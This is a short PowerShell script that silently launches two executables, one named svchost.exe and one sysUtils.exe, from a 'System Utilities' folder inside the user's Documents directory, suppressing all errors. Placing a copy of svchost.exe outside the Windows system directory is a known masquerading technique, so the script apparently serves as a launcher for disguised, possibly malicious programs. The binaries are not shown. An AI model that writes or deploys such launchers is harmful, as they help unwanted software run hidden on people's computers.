try{
Start-Process "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities\svchost.exe"
} catch{

}
try{
    Start-Process "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities\sysUtils.exe"
} catch{
        
}
